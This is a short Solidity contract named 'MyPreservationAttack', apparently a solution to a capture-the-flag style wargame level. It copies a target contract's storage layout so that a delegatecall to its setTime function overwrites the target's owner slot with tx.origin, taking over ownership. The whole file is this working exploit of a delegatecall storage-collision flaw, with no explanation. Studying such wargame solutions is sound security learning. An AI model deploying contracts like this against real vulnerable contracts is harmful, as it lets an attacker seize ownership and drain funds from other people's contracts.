// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract MyPreservationAttack {
    address public slot0;
    address public slot1;
    address public owner;

    function setTime(uint256 _time) public {
        owner = tx.origin;
    }
}
